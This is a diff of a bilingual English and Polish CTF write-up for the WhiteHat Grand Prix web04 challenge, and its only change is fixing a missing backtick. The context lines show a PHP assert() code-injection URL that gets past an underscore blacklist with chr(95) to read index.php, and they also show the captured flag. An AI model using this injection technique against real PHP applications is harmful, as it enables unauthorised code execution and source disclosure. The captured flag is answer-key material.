@@ -36,7 +36,7 @@ While `_` is blacklisted, we can just concatenate string with `chr(95)` instead 
 
 `http://web04.grandprix.whitehatvn.com/index.php?assert=assert(%27print(file%27.chr(95).%27get%27.chr(95).%27contents(%22index.php%22))%27)`
 
-in order to call `assert('file_get_contents("index.php")')
+in order to call `assert('file_get_contents("index.php")')`
 
 and the flag is in the source code: `WhiteHat{36b32e1f18a0da66de3b9dd29db947155b35320f}`
 
@@ -75,6 +75,6 @@ Co prawda `_` jest na blackliście, ale możemy po prostu skleić sobie stringa 
 
 `http://web04.grandprix.whitehatvn.com/index.php?assert=assert(%27print(file%27.chr(95).%27get%27.chr(95).%27contents(%22index.php%22))%27)`
 
-Aby wywołać `assert('file_get_contents("index.php")')
+Aby wywołać `assert('file_get_contents("index.php")')`
 
 I w źródle jest już flaga: `WhiteHat{36b32e1f18a0da66de3b9dd29db947155b35320f}`
